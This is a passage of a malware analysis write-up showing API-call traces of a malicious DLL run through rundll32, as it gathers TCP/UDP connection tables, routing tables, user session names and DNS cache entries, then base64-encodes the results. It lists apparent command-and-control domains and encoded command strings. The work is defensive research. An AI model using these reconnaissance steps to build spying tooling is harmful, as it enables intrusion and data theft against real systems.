[PAR] PVOID           pTcpTable  : 0x0000004A4DC8FEB0
[PAR] PDWORD          pdwSize    : 0x0000004A4FB5E8AC
[PAR] BOOL            bOrder     : 0x1
[PAR] ULONG           ulAf       : 0x2
[PAR] TCP_TABLE_CLASS TableClass : 0x5 (TCP_TABLE_OWNER_PID_ALL)
[PAR] ULONG           Reserved   : 0x0
[RET] [0x4a4f91545f]

[CNT] [927]
[PTP] [0xb20] [0xa04] [c:\windows\system32\rundll32.exe]
[API] <GetExtendedTcpTable> in [iphlpapi.dll] 
[PAR] PVOID           pTcpTable  : 0x0000004A4DC8F0F0
[PAR] PDWORD          pdwSize    : 0x0000004A4FB5E8AC
[PAR] BOOL            bOrder     : 0x1
[PAR] ULONG           ulAf       : 0x2
[PAR] TCP_TABLE_CLASS TableClass : 0x2 (TCP_TABLE_BASIC_ALL)
[PAR] ULONG           Reserved   : 0x0
[RET] [0x4a4f91545f]

[CNT] [973]
[PTP] [0xb20] [0xa04] [c:\windows\system32\rundll32.exe]
[API] <GetExtendedUdpTable> in [iphlpapi.dll] 
[PAR] PVOID           pUdpTable  : 0x0000004A4DC8F750
[PAR] PDWORD          pdwSize    : 0x0000004A4FB5E8AC
[PAR] BOOL            bOrder     : 0x1
[PAR] ULONG           ulAf       : 0x2
[PAR] UDP_TABLE_CLASS TableClass : 0x1 (UDP_TABLE_OWNER_PID)
[PAR] ULONG           Reserved   : 0x0
[RET] [0x4a4f91586c]

[CNT] [1072]
[PTP] [0xb20] [0xa04] [c:\windows\system32\rundll32.exe]
[API] <GetExtendedUdpTable> in [iphlpapi.dll] 
[PAR] PVOID           pUdpTable  : 0x0000004A4DC95730
[PAR] PDWORD          pdwSize    : 0x0000004A4FB5E8AC
[PAR] BOOL            bOrder     : 0x1
[PAR] ULONG           ulAf       : 0x2
[PAR] UDP_TABLE_CLASS TableClass : 0x0 (UDP_TABLE_BASIC)
[PAR] ULONG           Reserved   : 0x0
[RET] [0x4a4f91586c]
```

**III. Result**  

```html
[CNT] [1122]
[PTP] [0xb20] [0xa04] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000004A4DCB0270
[STR]        -> "39B3"
[STR]           "T 0.0.0.0:135,0 2,2 620 svchost.exe"
[STR]           "T 0.0.0.0:445,0 2,2 4 System"
[STR]           "T 0.0.0.0:1025,0 2,2 432 wininit.exe"
[STR]           "T 0.0.0.0:1026,0 2,2 864 svchost.exe"
[STR]           "T 0.0.0.0:1027,0 2,2 532 lsass.exe"
[STR]           "T 0.0.0.0:1028,0 2,2 900 svchost.exe"
[STR]           "T 0.0.0.0:1029,0 2,2 1036 spoolsv.exe"
[STR]           "T 0.0.0.0:1030,0 2,2 524 services.exe"
[STR]           "T 169.254.143.85:139,0 2,2 4 System"
[STR]           "T 169.254.143.85:1033,1 169.254.143.46:8041 5,2 2848 rundll32.exe"
[STR]           "T 169.254.143.85:1034,1 169.254.143.46:8041 5,2 2848 rundll32.exe"
[STR]           "T 0.0.0.0:135,0 2"
[STR]           "T 0.0.0.0:1029,0 2"
[STR]           "U 0.0.0.0:5355,2 312 svchost.exe"
[STR]           "U 169.254.143.85:137,2 4 System"
[STR]           "U 169.254.143.85:138,2 4 System"
[STR]           "U 0.0.0.0:5355"
[STR]           "U 0.137.0.0:43518"
[STR]           "U 0.0.0.0:0"
[PAR] DWORD  cbBinary   : 0x4fe
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000004A4DCB5E70
[PAR] DWORD* pcchString : 0x0000004A4FB5E88C
[RET] [0x4a4f92e028]
```
<a id="GetIpForwardTable"></a>
# GetIpForwardTable  

**I. Order**  

```html
[CNT] [327]
[PTP] [0xbec] [0xafc] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000078CCA569D0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+U//EErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000078CCA697B0
[PAR] DWORD   *pcbBinary : 0x00000078CE96E56C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x78ce8cbea1]
```

**II. Execution**  

```html
[CNT] [337]
[PTP] [0xbec] [0xafc] [c:\windows\system32\rundll32.exe]
[API] <GetAdaptersInfo> in [iphlpapi.dll] 
[PAR] PIP_ADAPTER_INFO AdapterInfo : 0x00000078CCA4F3E0
[PAR] PULONG           SizePointer : 0x00000078CE96E474
[RET] [0x78ce8daaca]

[CNT] [338]
[PTP] [0xbec] [0xafc] [c:\windows\system32\rundll32.exe]
[API] <GetIpForwardTable> in [iphlpapi.dll] 
[PAR] PMIB_IPFORWARDTABLE pIpForwardTable : 0x00000078CCA4FA40
[PAR] PULONG              pdwSize         : 0x00000078CE96E470
[PAR] BOOL                bOrder          : 0x1
[RET] [0x78ce8daae9]
```

**III. Result**  

```html
[CNT] [586]
[PTP] [0xbec] [0xafc] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000078CCA4FEC0
[STR]        -> "1AD4"
[STR]           "127.0.0.0 255.0.0.0 127.0.0.1 1 306"
[STR]           "127.0.0.1 255.255.255.255 127.0.0.1 1 306"
[STR]           "127.255.255.255 255.255.255.255 127.0.0.1 1 306"
[STR]           "169.254.0.0 255.255.0.0 169.254.143.85 3 266"
[STR]           "169.254.143.85 255.255.255.255 169.254.143.85 3 266"
[STR]           "169.254.255.255 255.255.255.255 169.254.143.85 3 266"
[STR]           "224.0.0.0 240.0.0.0 127.0.0.1 1 306"
[STR]           "224.0.0.0 240.0.0.0 169.254.143.85 3 266"
[STR]           "255.255.255.255 255.255.255.255 127.0.0.1 1 306"
[STR]           "255.255.255.255 255.255.255.255 169.254.143.85 3 266"
[PAR] DWORD  cbBinary   : 0x396
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000078CCA733C0
[PAR] DWORD* pcchString : 0x00000078CE96E3BC
[RET] [0x78ce8ce028]
```
<a id="QuerySessionInformation"></a>
# QuerySessionInformation  

**I. Order**  

```html
[CNT] [429]
[PTP] [0x654] [0x2d8] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000004AAFBF6BC0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+efmhErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000004AAFC09A30
[PAR] DWORD   *pcbBinary : 0x0000004AB1B4E74C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x4ab1aabea1]
```

**II. Execution**  

```html
[CNT] [452]
[PTP] [0x654] [0x2d8] [c:\windows\system32\rundll32.exe]
[API] <WTSEnumerateSessionsW> in [wtsapi32.dll] 
[PAR] HANDLE              hServer       : 0x0 (WTS_CURRENT_SERVER_HANDLE)
[PAR] DWORD               Reserved      : 0x0
[PAR] DWORD               Version       : 0x1
[PAR] PWTS_SESSION_INFOW* ppSessionInfo : 0x0000004AB1B4E5E8
[PAR] DWORD*              pCount        : 0x0000004AB1B4E5E0
[RET] [0x4ab1aafe7c]

[CNT] [455]
[PTP] [0x654] [0x2d8] [c:\windows\system32\rundll32.exe]
[API] <WTSQuerySessionInformationW> in [wtsapi32.dll] 
[PAR] HANDLE         hServer        : 0x0
[PAR] DWORD          SessionId      : 0x1
[PAR] WTS_INFO_CLASS WTSInfoClass   : 0x5 (WTSUserName)
[PAR] LPWSTR*        ppBuffer       : 0x0000004AB1B4E600
[PAR] DWORD*         pBytesReturned : 0x0000004AB1B4E5E4
[RET] [0x4ab1aafeb6]

[CNT] [457]
[PTP] [0x654] [0x2d8] [c:\windows\system32\rundll32.exe]
[API] <WTSQuerySessionInformationW> in [wtsapi32.dll] 
[PAR] HANDLE         hServer        : 0x0
[PAR] DWORD          SessionId      : 0x1
[PAR] WTS_INFO_CLASS WTSInfoClass   : 0x6 (WTSWinStationName)
[PAR] LPWSTR*        ppBuffer       : 0x0000004AB1B4E5F8
[PAR] DWORD*         pBytesReturned : 0x0000004AB1B4E5E4
[RET] [0x4ab1aaff4e]
```

**III. Result**  

```html
[CNT] [482]
[PTP] [0x654] [0x2d8] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000004AAFBF6BC0
[STR]        -> "9ABE"
[STR]           "1 Console home\user"
[PAR] DWORD  cbBinary   : 0x32
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000004AAFC02B80
[PAR] DWORD* pcchString : 0x0000004AB1B4E5DC
[RET] [0x4ab1aae028]
```

<a id="GetDnsCacheDataTable"></a>
# GetDnsCacheDataTable  

**I. Order**  

```html
[CNT] [327]
[PTP] [0xbb0] [0x830] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000004CA08998E0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+YPHyErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000004CA08AB260
[PAR] DWORD   *pcbBinary : 0x0000004CA282E70C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x4ca278bea1]
```

**II. Execution**  

```html
[CNT] [341]
[PTP] [0xbb0] [0x830] [c:\windows\system32\rundll32.exe]
[API] <DnsGetCacheDataTable> in [DNSAPI.dll] 
[INF] [ Undocumented Function ]
[PAR] PDNSCACHEENTRY  lpDnsCacheEntry : 0x0000004CA089EAC0
[RET] [0x4ca278cb0c]
```

**III. Result**  

Well... unsurprisingly, lots of C2 in there...

```html
[CNT] [553]
[PTP] [0xbb0] [0x830] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000004CA08B7070
[STR]        -> "B738"
[STR]           "megatoolkit.com"
[STR]           "megatoolkit.com"
[STR]           "bazarunet.com"
[STR]           "bazarunet.com"
[STR]           "hotspot.accesscam.org"
[STR]           "hotspot.accesscam.org"
[STR]           "api.dropboxapi.com"
[STR]           "api.dropboxapi.com"
[STR]           "api.telegram.org"
[STR]           "api.telegram.org"
[STR]           "43.143.254.169.in-addr.arpa"
[STR]           "codevexillium.org"
[STR]           "codevexillium.org"
[STR]           "greshunka.com"
[STR]           "greshunka.com"
[STR]           "content.dropboxapi.com"
[STR]           "content.dropboxapi.com"
[STR]           "45.143.254.169.in-addr.arpa"
[STR]           "46.143.254.169.in-addr.arpa"
[STR]           "42.143.254.169.in-addr.arpa"
[STR]           "hanagram.jp"
[STR]           "hanagram.jp"
[STR]           "checkip.dyndns.org"
[STR]           "checkip.dyndns.org"
[STR]           "internal-hot-addition.glitch.me"
[STR]           "internal-hot-addition.glitch.me"
[STR]           "www.dronerc.it"
[STR]           "www.dronerc.it"
[STR]           "content.dropbox.com"
[STR]           "content.dropbox.com"
[STR]           "www.addfriend.kr"
[STR]           "www.addfriend.kr"
[STR]           "tiguanin.com"
[STR]           "tiguanin.com"
[STR]           "thefinetreats.com"
[STR]           "thefinetreats.com"
[STR]           "api.dropbox.com"
[STR]           "api.dropbox.com"
[STR]           "zebra.wthelpdesk.com"
[STR]           "zebra.wthelpdesk.com"
[STR]           "transplugin.io"
[STR]           "transplugin.io"
[PAR] DWORD  cbBinary   : 0x63e
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000004CA08B76C0
[PAR] DWORD* pcchString : 0x0000004CA282E57C
[RET] [0x4ca278e028]
```
